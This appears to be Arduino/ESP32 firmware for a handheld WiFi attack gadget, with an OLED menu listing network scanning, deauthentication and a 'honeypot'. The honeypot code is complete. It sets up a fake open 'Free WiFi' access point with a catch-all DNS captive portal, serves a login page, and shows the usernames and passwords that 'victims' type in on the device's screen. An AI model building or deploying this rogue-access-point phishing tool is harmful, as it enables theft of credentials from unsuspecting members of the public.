//pio run --target uploadfs
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <SPIFFS.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>

#define i2c_Address 0x3C //  Can be 0x3D

#define SCREEN_WIDTH 128 
#define SCREEN_HEIGHT 64 
#define OLED_RESET -1    // Reset pin, -1 if not used

#define BUTTON_SELECT 0
#define BUTTON_DOWN 1
#define BUTTON_UP 2

Adafruit_SH1106G display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

const char* WIFI_SSID = "Free WiFi";
const char* WIFI_PASSWORD = "123456789";

const byte DNS_PORT = 53;
DNSServer dnsServer;
AsyncWebServer server(80);

// Меню
String menuItems[] = {"WiFi Networks", "Deauthe", "Start Honeypot"};
int currentMenuIndex = 0;
bool honeypotActive = false;

void displayMenu() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(1);
  display.setCursor(0, 0);
  for (int i = 0; i < 3; i++) {
    if (i == currentMenuIndex) {
      display.print("> ");
    } else {
      display.print("  ");
    }
    display.println(menuItems[i]);
  }
  display.display();
}

void setupHoneypot() {
  WiFi.softAP(WIFI_SSID, WIFI_PASSWORD);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
    request->send(SPIFFS, "/login.html", "text/html");
  });

  server.on("/login", HTTP_POST, [](AsyncWebServerRequest* request) {
    String username = request->getParam("username", true)->value();
    String password = request->getParam("password", true)->value();

    display.clearDisplay();
    display.setCursor(0, 0);
    display.print("IP: ");
    display.println(WiFi.softAPIP());
    display.print("User: ");
    display.println(username);
    display.print("Pass: ");
    display.println(password);

    if (username == "admin" && password == "password123") {
      //display.println("Login success!");
      request->send(200, "text/html", "<h1>Login successful!</h1>");
    } else {
      //display.println("Invalid login");
      request->send(200, "text/html", "<h1>Invalid credentials!</h1>");
    }
    display.display();
  });

  server.begin();
}

void setup() {
  Serial.begin(115200);

  pinMode(BUTTON_UP, INPUT_PULLUP);
  pinMode(BUTTON_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_SELECT, INPUT_PULLUP);

  if (!display.begin(i2c_Address)) {
    Serial.println("Error initialize display");
    while (1);
  }

  if (!SPIFFS.begin(true)) {
    Serial.println("Error SPIFFS");
    return;
  }

  display.clearDisplay();
  displayMenu();
}

void loop() {
  // Menu move
  if (digitalRead(BUTTON_UP) == LOW) {
    currentMenuIndex = (currentMenuIndex - 1 + 3) % 3;
    displayMenu();
    delay(200); //antifalse press
  }

  if (digitalRead(BUTTON_DOWN) == LOW) {
    currentMenuIndex = (currentMenuIndex + 1) % 3;
    displayMenu();
    delay(200); // antifalse press
  }

  if (digitalRead(BUTTON_SELECT) == LOW) {
    if (menuItems[currentMenuIndex] == "Start Honeypot") {
      display.clearDisplay();
      setupHoneypot();
      display.println("Waiting victims in "+ WiFi.softAPIP().toString());
      Serial.println("Server IP: " + WiFi.softAPIP().toString());
      display.display();
      
      honeypotActive = true;
    }
    delay(200); // antifalse press
  }

  if (honeypotActive) {
    dnsServer.processNextRequest();
  }
}
